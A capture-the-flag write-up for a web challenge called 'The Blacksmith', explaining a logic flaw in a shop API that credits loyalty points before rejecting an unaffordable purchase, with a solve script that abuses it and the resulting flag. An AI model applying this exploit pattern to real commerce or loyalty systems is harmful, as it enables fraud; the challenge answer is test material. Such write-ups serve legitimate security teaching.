---
layout: default
title: The Blacksmith
permalink: /:path/
parent: Web
nav_order: 7
---
# The Blacksmith

> Points: 425 [1000]

## Description

> In the middle of town lies a huge colosseum, where gladiators battle for the glory of being the town's best. Next to the colosseum is a digital weapon shop owned by a famous blacksmith who sells some of the finest weapons money can buy. Rumor has it that the shop sells a rare sword that gives you a flag. The blacksmith only reserves rare items for his most loyal customers or those who've made a name for themselves in the colosseum. However, this preferential treatment has not gone unnoticed. Most of the gladiators are fed up and have started to boycott the shop. In response, the blacksmith has started rushing to patch his weapon shop code to phase out the "loyalty system" and his code is now full of hotfixes.

## Solution
Looking at the provided source code, we can see that in order to get the flag, we have to purchase the `flagsword` from the shop. Looking at the cost of flagsword reveals that as a new customer, we are able to buy the sword. However, we are unable to purchase the `flagsword` as we are not a "loyal customer".

```python
# ...

SHOP = {
    "customers": [],
    "inventory": {
        "regular": (
            Weapon("brokensword", 5, 0),
            Weapon("woodensword", 5, 1),
            Weapon("stonesword", 10, 2),
            Weapon("ironsword", 50, 10),
            Weapon("goldsword", 100, 20),
            Weapon("diamondsword", 500, 100),
        ),
        "exclusive": (Weapon("flagsword", 5, 0),),
    },
}

# ...

@app.get("/customer/new")
def register():
    if LOYALTY_SYSTEM_ACTIVE:
        customer = Customer(id=uuid4().hex, gold=5, loyalty=Loyalty(1, []))
    else:
        # Ensure loyalty immutable
        customer = Customer(
            id=uuid4().hex, gold=5, loyalty=RestrictedLoyalty(1, [])
        )

    SHOP["customers"].append(customer)

    return {"id": customer.id}

# ...

@app.get("/buy")
def buy_item(customer_id="", items: list[str] | None = Query(default=[])):
    customer_idx = Customer.index_from_id(customer_id)
    # ...
    match SHOP["customers"][customer_idx].tier:
        case "regular":
            get_weapon = partial(
                weapon_from_name, SHOP["inventory"]["regular"]
            )
        case "exclusive":
            get_weapon = partial(
                weapon_from_name,
                [
                    *SHOP["inventory"]["regular"],
                    *SHOP["inventory"]["exclusive"],
                ],
            )
        case _:
            raise HTTPException(status_code=500)
    # ...
    if "flagsword" in [weapon.name for weapon in cart]:
        return {"purchased": FLAG}

    return {"purchased": cart}
```

Scrolling through the code, it seems that the only way to earn loyalty is to spend money on the shop. However, we only have 5 gold to work with and the other endpoints do not seem to provide a way for customers to earn more gold or loyalty. 

Fortunately, there is a logic error within the code that allows us to earn loyalty without us having to spend any gold. The logic error is within the `buy_item` endpoint. The `buy_item` endpoint checks if the customer has enough gold to purchase a singular item in the cart. However, it only check if the customer has enough gold to purchase the items in the cart **after adding the loyalty points that cound be earned from the purchase**. This allows us to earn loyalty without having to spend any gold.

```python
@app.get("/buy")
def buy_item(customer_id="", items: list[str] | None = Query(default=[])):
    # ...
    total_price = 0
    point_history = []
    for item in cart:
        if item.price > SHOP["customers"][customer_idx].gold:
            raise HTTPException(status_code=403)
        total_price += item.price
        # VULNERABLE PART HERE
        if item.loyalty_points > 0:
            point_history += [item.loyalty_points]

    try:
        if len(point_history) > 0:
            SHOP["customers"][
                customer_idx
            ].loyalty.point_history += point_history
        if SHOP["customers"][customer_idx].gold < total_price:
            raise HTTPException(status_code=403)
        SHOP["customers"][customer_idx].gold -= total_price
    except:
        raise HTTPException(status_code=403)

    if "flagsword" in [weapon.name for weapon in cart]:
        return {"purchased": FLAG}

    return {"purchased": cart}

```

As such, we can create a quick python script usings `requests` to create a new account and accumulate the loyalty points needed to purchase the `flagsword`. We can then use the 5 gold we have to purchase the `flagsword` and get the flag.

```python
import requests

WEB_URL = 'xxx'
r = requests.get(f'http://{WEB_URL}/customer/new')
CUSTOMER_ID = r.json()['id']
print(CUSTOMER_ID)
for i in range(14):
    requests.get(f'http://{WEB_URL}/buy', params={'customer_id': f'{CUSTOMER_ID}', 'items': ['woodensword' for i in range(100)]})
r = requests.get(f'http://{WEB_URL}/buy', params={'customer_id': f'{CUSTOMER_ID}', 'items': ['flagsword']})
print(r.json()['purchased'])
```

Output:
```
kelvin@Kelvin-Desktop:/mnt/c/Users/kelvi/Downloads/stf22/web_the_blacksmith/web_the_blacksmith$ python solve.py
42cdb01804e2439e970cd77f6d90736c
STF22{y0u_b0ught_4_v3ry_3xcLu51v3_sw0rd_w3LL_d0n3_31337}
kelvin@Kelvin-Desktop:/mnt/c/Users/kelvi/Downloads/stf22/web_the_blacksmith/web_the_blacksmith$ 
```

## Flag
`STF22{y0u_b0ught_4_v3ry_3xcLu51v3_sw0rd_w3LL_d0n3_31337}`